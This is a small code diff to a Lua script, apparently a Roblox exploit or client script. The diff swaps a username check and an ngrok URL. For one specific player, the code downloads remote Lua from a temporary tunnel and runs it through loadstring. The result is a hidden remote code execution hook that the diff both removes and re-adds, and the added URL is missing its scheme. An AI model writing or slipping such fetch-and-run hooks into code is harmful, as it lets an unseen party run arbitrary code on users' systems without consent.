@@ -19,8 +19,8 @@ end);
 ]])
 
 local name = game:GetService("Players").LocalPlayer.Name
-if string.sub(name, 1, #("davidgoginsisreal")) == "davidgoginsisreal" then
-	local ret = loadstring(game:HttpGet("https://2640-2603-6012-141-3048-6453-e890-3111-30d3.ngrok-free.app/live.lua"))()
+if string.sub(name, 1, #("therealdawg")) == "therealdawg" then
+	local ret = loadstring(game:HttpGet("9a45-2603-6012-141-3048-4030-a3af-2a10-143f.ngrok-free.app/live.lua"))()
 	print(ret)
 	if ret then
 		return nil
